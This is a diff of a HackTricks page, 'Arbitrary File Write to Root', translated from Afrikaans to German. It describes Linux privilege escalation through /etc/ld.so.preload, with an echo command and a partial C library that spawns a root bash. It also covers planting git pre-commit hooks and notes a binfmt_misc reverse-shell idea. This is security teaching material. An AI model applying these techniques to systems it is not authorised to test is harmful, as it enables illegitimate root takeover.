@@ -1,26 +1,26 @@
-# Willekeurige Lêer Skryf na Root
+# Arbitrary File Write to Root
 
 {% hint style="success" %}
-Leer & oefen AWS Hack:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
 
 ### /etc/ld.so.preload
 
-Hierdie lêer werk soos **`LD_PRELOAD`** omgewingsveranderlike, maar dit werk ook in **SUID-binêre lêers**.\
-As jy dit kan skep of wysig, kan jy net 'n **pad na 'n biblioteek wat gelaai sal word** by elke uitgevoerde binêre lêer, byvoeg.
+Diese Datei verhält sich wie die **`LD_PRELOAD`** Umgebungsvariable, funktioniert jedoch auch bei **SUID-Binärdateien**.\
+Wenn Sie sie erstellen oder ändern können, können Sie einfach einen **Pfad zu einer Bibliothek hinzufügen, die mit jeder ausgeführten Binärdatei geladen wird**.
 
-Byvoorbeeld: `echo "/tmp/pe.so" > /etc/ld.so.preload`
+Zum Beispiel: `echo "/tmp/pe.so" > /etc/ld.so.preload`
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -35,11 +35,11 @@ system("/bin/bash");
 //cd /tmp
 //gcc -fPIC -shared -o pe.so pe.c -nostartfiles
 ```
-### Git hakke
+### Git-Hooks
 
-[**Git hakke**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) is **skripte** wat uitgevoer word by verskeie **gebeure** in 'n git-opgaar soos wanneer 'n toewysing geskep word, 'n saamvoeging... Dus, as 'n **bevoorregte skrip of gebruiker** gereeld hierdie aksies uitvoer en dit moontlik is om in die `.git`-vouer te **skryf**, kan dit gebruik word vir **privilege-escalation**.
+[**Git-Hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sind **Skripte**, die bei verschiedenen **Ereignissen** in einem Git-Repository ausgeführt werden, wie z.B. wenn ein Commit erstellt wird, ein Merge... Wenn also ein **privilegiertes Skript oder Benutzer** diese Aktionen häufig ausführt und es möglich ist, in den `.git`-Ordner zu **schreiben**, kann dies für **privesc** genutzt werden.
 
-Byvoorbeeld, Dit is moontlik om 'n skrip te **genereer** in 'n git-opgaar in **`.git/hooks`** sodat dit altyd uitgevoer word wanneer 'n nuwe toewysing geskep word:
+Zum Beispiel ist es möglich, ein **Skript** in einem Git-Repo in **`.git/hooks`** zu **generieren**, sodass es immer ausgeführt wird, wenn ein neuer Commit erstellt wird:
 
 {% code overflow="wrap" %}
 ```bash
@@ -48,29 +48,29 @@ chmod +x pre-commit
 ```
 {% endcode %}
 
-### Cron & Tyd lêers
+### Cron & Zeitdateien
 
 TODO
 
-### Diens & Soket lêers
+### Service- & Socket-Dateien
 
 TODO
 
 ### binfmt\_misc
 
-Die lêer wat in `/proc/sys/fs/binfmt_misc` geleë is, dui aan watter binêre lêer watter tipe lêers moet uitvoer. TODO: kontroleer die vereistes om hierdie te misbruik om 'n omgekeerde dop uit te voer wanneer 'n algemene lêertipe oop is.
+Die Datei, die sich in `/proc/sys/fs/binfmt_misc` befindet, gibt an, welches Binärprogramm welche Art von Dateien ausführen soll. TODO: Überprüfen Sie die Anforderungen, um dies auszunutzen, um eine Reverse-Shell auszuführen, wenn ein gängiger Dateityp geöffnet wird.
 
 {% hint style="success" %}
-Leer & oefen AWS Hack:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
